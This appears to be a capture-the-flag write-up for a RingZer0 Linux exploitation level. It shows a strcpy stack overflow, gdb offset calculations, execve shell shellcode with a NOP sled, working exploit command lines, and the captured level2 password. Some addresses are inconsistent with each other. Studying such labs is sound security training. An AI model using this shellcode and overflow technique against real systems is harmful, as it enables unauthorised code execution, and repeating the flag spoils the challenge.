@@ -1,0 +1,122 @@
+Pwnage linux
+Challenge 1
+https://ringzer0ctf.com/challenges/80
+
+ssh -p 10080 level1@challenges.ringzer0ctf.com
+Password : level1
+
+-----------
+Challenges are in /levels
+passwords are in /home/levelX/.pass
+
+level1 binary is owned by level2.
+
+Exploiting /levels/level1 will give us access to /home/level2/.pass
+------------
+The code for level1.c :
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+
+    char buf[1024];
+
+    strcpy(buf, argv[1]);
+    return 0;
+}
+
+---------------
+We want to store some shellcode in buf[] variable.
+We then want to override the return address of the function so that it point to buf[].
+When the function return, it jump to &buf and will execute our shell code.
+---------------
+We can launch the bin using gdb 'gdb ./level1'
+We set a breakpoint to line 10 'b 10'
+Then we run the program with 'r SomeInput'
+
+When the code stop, 
+	We can get the adress of buf 'p &buf':
+		0xffffd460
+	we can get stack informations with 'info frame' :
+		Stack level 0, frame at 0xffffdc80:
+		 eip = 0x8048440 in main (level1.c:10); saved eip = 0xf7e34637
+		 source language c.
+		 Arglist at 0xffffdc78, args: argc=2, argv=0xffffdd14
+		 Locals at 0xffffdc78, Previous frame's sp is 0xffffdc80
+		 Saved registers:
+		  ebp at 0xffffdc78, eip at 0xffffdc7c
+
+We want to override the eip register that is located at adress 0xffffdc7c
+
+Our buf has a size of 1024.
+
+0xffffdc7c - 0xffffd870 = 1036 (0x40c)
+
+There is 12 bytes between the end of the buf[] and the eip register.
+
+We first try to modify the eip sending 1037 bytes as input.
+
+--------------------
+In gdb we can use r `some command` so that the program will be runned using the output of `some command`.
+
+We use python to generate our input : `python -c 'import sys; sys.stdout.write("")'`
+--------------------
+
+For the first test we want to make sure our adress calculation are good :
+
+r `python -c 'import sys; sys.stdout.write("\xaa"*1024 + "\xbb" * 12 + "\xcc" * 2)'`
+
+We can get the eip value either from 'info frame' or reading the adress of eip directly 'p/x *0xffffd87c' :
+	0xf700cccc
+
+We see that we have overriden the first 2 bytes (little endian) of the eip register.
+
+---------------------
+We can replace the eip adress with the buf adress (In little endian):
+r `python -c 'import sys; sys.stdout.write("\xaa"*1024 + "\xbb" * 12 + "\x60\xd4\xff\xff")'`
+
+----------------------
+We now need some shellcode. We are gonna use this one : https://www.exploit-db.com/exploits/39625
+
+Which is 33 bytes. We now write the 33 bytes shell code + 1003 bytes of padding + the adress of buf
+
+I had some trouble with space characters (\x20). We can just pass the parameter enclosed with double quotes to resolve this issue.
+
+When running this in gdb :
+	r "`python -c 'import sys; sys.stdout.write("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\xbb"*1003 + "\x60\xd4\xff\xff")'`"
+
+We get a shell forked from the gdb process. Which is authenticated as level1 so we can't access the /home/level2/.pass yet.
+
+We need to run the ./level1 from the prompt.
+	./level1 "`python -c 'import sys; sys.stdout.write("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\xbb"*1003 + "\x60\xd4\xff\xff")'`"
+
+We get a segmentation fault. The address space is different when launching from gdb and from the prompt.
+
+There is a lot of factors for this but 2 mains ones :
+	- Environment variables are differents when launching in gdb vs prompt
+	- Gdb launch the script with the full path (/levels/level1) while we launch it with ./level1 so the argv array is bigger when launched in gdb.
+
+We can easily elliminate the argv difference by launching the script using /home/levels/level1
+
+It's harder to work around the environment variable since we don't control the box.
+
+We could try to guess the address of the &buf variable. It shouldn't be too far from what we see in gdb.
+
+To make this easier, we will add a "nop slide" before our shell code so we can simply jump somewhere in between &buf and the end of our nop slide to reach the shell code
+
+We try this :
+	/levels/level1 "`python -c 'import sys; sys.stdout.write("\x90" * 100 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\xbb"*903 + "\x60\xd4\xff\xff")'`"
+
+And get an illegal instruction. Now it's just a matter of guessing the adress of &buf.
+We try with 0xffffd480
+	/levels/level1 "`python -c 'import sys; sys.stdout.write("\x90" * 100 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\xbb"*903 + "\x80\xd4\xff\xff")'`"
+
+Annnnnddd we got a prompt
+
+whoami == level2
+
+cat /home/level2/.pass == TJyK9lJwZrgqc8nIIF6o
+
+Voilaa
